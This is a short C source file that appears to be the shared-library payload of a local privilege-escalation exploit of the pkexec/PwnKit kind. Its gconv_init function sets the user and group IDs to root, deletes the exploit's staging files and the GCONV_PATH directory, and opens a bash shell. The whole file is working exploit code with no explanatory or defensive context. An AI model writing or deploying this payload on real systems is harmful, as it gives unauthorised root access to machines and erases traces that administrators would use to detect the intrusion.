#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

void gconv(void) {}

void gconv_init(void) {
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);

    system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf GCONV_PATH=./ stage1 gconv-modules stage2.so stage1.c stage2.c; /bin/bash");
    exit(0);
}
